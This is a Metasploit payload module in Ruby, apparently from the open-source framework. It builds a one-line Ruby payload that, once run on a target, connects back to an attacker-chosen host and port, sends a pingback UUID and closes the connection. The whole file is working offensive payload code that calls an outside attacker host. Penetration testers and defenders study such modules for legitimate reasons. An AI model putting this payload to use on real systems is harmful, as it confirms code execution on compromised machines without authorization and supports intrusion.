module MetasploitModule
  CachedSize = 107

  include Msf::Payload::Single
  include Msf::Payload::Ruby
  include Msf::Payload::Pingback
  include Msf::Payload::Pingback::Options

  def initialize(info = {})
    super(
      merge_info(
        info,
        'Name' => 'Ruby Pingback, Reverse TCP',
        'Description' => 'Connect back to the attacker, sends a UUID, then terminates',
        'Author' => 'asoto-r7',
        'License' => MSF_LICENSE,
        'Platform' => 'ruby',
        'Arch' => ARCH_RUBY,
        'Handler' => Msf::Handler::ReverseTcp,
        'Session' => Msf::Sessions::Pingback,
        'PayloadType' => 'ruby'
      )
    )
  end

  def generate(_opts = {})
    # return prepends(ruby_string)
    return ruby_string
  end

  def ruby_string
    self.pingback_uuid ||= generate_pingback_uuid
    lhost = datastore['LHOST']
    lhost = "[#{lhost}]" if Rex::Socket.is_ipv6?(lhost)
    return "require'socket';" \
      "c=TCPSocket.new'#{lhost}',#{datastore['LPORT'].to_i};" \
      "c.puts'#{[[self.pingback_uuid].pack('H*')].pack('m0')}'.unpack('m0');" \
      'c.close'
  end
end
